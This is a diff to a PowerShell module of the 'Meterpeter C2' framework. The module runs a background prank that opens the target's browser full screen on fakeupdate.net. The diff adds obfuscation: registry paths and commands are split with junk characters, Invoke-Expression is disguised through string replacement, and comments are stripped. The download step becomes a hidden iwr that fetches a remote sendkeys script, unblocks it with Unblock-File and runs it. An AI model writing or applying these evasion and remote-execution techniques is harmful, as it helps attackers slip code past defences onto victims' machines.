@@ -6,10 +6,10 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.5
+   PS cmdlet Dev version: v1.0.6
 
 .DESCRIPTION
-   Auxiliary module of Meterpeter C2 v2.10.13 that executes an prank in background.
+   Auxiliary module of Meterpeter C2 v2.10.14.1 that executes an prank in background.
    The prank opens the default web browser in fakeupdate.net website in full screen
    mode. To abort the prank target user requires to manual press {F11} on is keyboard.
 
@@ -54,7 +54,6 @@
 
 #Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
-#Store operative system version
 $OsVersion = [System.Environment]::OSVersion.Version.Major
 If([string]::IsNullOrEmpty($OsVersion))
 {
@@ -65,8 +64,7 @@ If([string]::IsNullOrEmpty($OsVersion))
 
 
 #Store default web browser name
-$RegexDecode = (([regex]::Matches("ecioh@Cre@sU\pt@th\sno@ita@icos@sAlrU\snoita@ico@ssA\lle@hS\swod@niW\tf@os@orciM\ERA@WTF@OS\:UCK@H",'.','RightToLeft')|ForEach{$_.value}) -join '')
-$DefaultSettingPath = "$RegexDecode" -replace '@',''
+$DefaultSettingPath = "H'KC@U:\SO'FTWA@RE\M@icro@s'oft\W@ind'o@ws\Sh'el@l\A@ssoc@i'atio@ns\U'rlAs@soc@ia'ti@ons\h@tt'p\Us@erC@hoi@ce" -replace '(@|'')',''
 $DefaultBrowserName = (Get-Item -Path "$DefaultSettingPath"|Get-ItemProperty).ProgId
 If([string]::IsNullOrEmpty($DefaultBrowserName))
 {
@@ -76,12 +74,11 @@ If([string]::IsNullOrEmpty($DefaultBrowserName))
 }
 
 
-#Create PSDrive to HK`EY_CL`ASSES_RO`OT
 $ShellCommand = "`$n£u@l£l = N@e£w-£P@SD£ri@ve -P£SP@ro£vid@er r£eg@ist@ry -£Ro@o£t 'H£K@EY_£C@LAS£SE@S_£RO@O@T' -N@a@me 'H£K@C£R'" -replace '(@|£)',''
 $ShellCommand|&('XeX' -replace '^(X)','i')
 
 #Get the default browser executable command/path
-$TestMeNpw = "£H@KC£R@:\$DefaultBrowserName\£s@hel@l\£o@pe@n\c£om@ma£n@d" -replace '(@|£)',''
+$TestMeNpw = "£_H@KC£_R@:\$DefaultBrowserName\£_s@hel@l\£_o@pe@n\c£_om@ma£_n@d" -replace '(@|£_)',''
 $DefaultBrowserOpenCommand = (Get-Item "$TestMeNpw"|Get-ItemProperty).'(default)'
 $DefaultBrowserPathSanitize = [regex]::Match($DefaultBrowserOpenCommand,'\".+?\"')
 Remove-PSDrive -Name 'HKCR'
@@ -120,8 +117,8 @@ Else
 }
 
 #Download sendkes cmdlet from github
-iwr -uri "$SendKeyscmdlet" -OutFile "sendkeys.ps1"
-#Execute sendkeys cmdlet to open default browser in fakeupdate.net in full windows mode
+$Executame = "@i£wr -£u@r£i `"$SendKeyscmdlet`" -£O£u@tF£i@l£e `"sendkeys.ps1`"|Unblock-File" -replace '(@|£)',''
+$Executame|&('Rex' -replace 'R','I')
 .\sendkeys.ps1 -Program "$DefaultBrowserPath" -SendKey "https://fakeupdate.net/$SystemId/~{F11}"
 
 #CleanUp
